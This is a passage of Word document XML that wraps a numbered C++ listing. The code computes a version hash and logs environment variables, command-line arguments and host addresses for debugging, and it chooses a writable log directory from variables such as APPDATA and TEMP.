          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>assert</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>startOfCodeSegment</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt; &amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>endOfCodeSegment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49         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 50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2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ptrdiff_t</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> length = &amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>endOfCodeSegment</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> - &amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>startOfCodeSegment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51 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 52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version = Utilities::hash(&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>startOfCodeSegment</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, length);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 53         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 54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version) {</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 55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"Unable to determine version"</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56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57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version;</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 58         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 59 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 60 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 61 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 62 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>void</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b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>logUsefulDebug</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argc</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63         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 64         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Begin list of all environment variables and values:"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65         std::vector&lt;std::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envVarNames</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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getListEnvVarNames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66         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 67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0;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&lt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>envVarNames.size</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68                 logger-&gt;log(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>envVarNames</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==&gt; "</w:t>
      </w:r>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getEnvVar</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envVarNames</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69         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 70         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"End of all environment variables and values"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71         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 72         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 73         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">"Begin list of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>argv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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74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0;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&lt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>argc</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75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2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>NULL</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76                         logger-&gt;log(</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77                 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 78         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 79         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">"End list of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>argv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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 80 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 81 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 82 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 83 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>void</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b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>logAddresses</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84         std::vector&lt;std::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 addresses = Utilities::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>getHostAddresses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85         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 86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0;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&lt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>addresses.size</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87                 logger-&gt;log(addresses[</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88         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 89 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 90 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 91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92 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>* Criteria:</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 93 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>*      Writable</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 94 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>*      Sufficient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free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space (at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least 1MiB)</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 95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96 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>* Typically</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tries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known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environment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variables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as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possible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locations</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 97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98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b/>
          <w:bCs/>
          <w:color w:val="96969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absolute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path</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where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log</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can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be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stored (includes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log</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filename)</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 99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100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b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>findSuitableLogLocation</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101         std::vector&lt;std::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envVarsToTry</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102         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Windows type</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">103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"APPDATA"</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104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"LOCALAPPDATA"</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105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"USERPROFILE"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106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"PUBLIC"</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107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"TEMP"</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108         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">// </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Unixie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
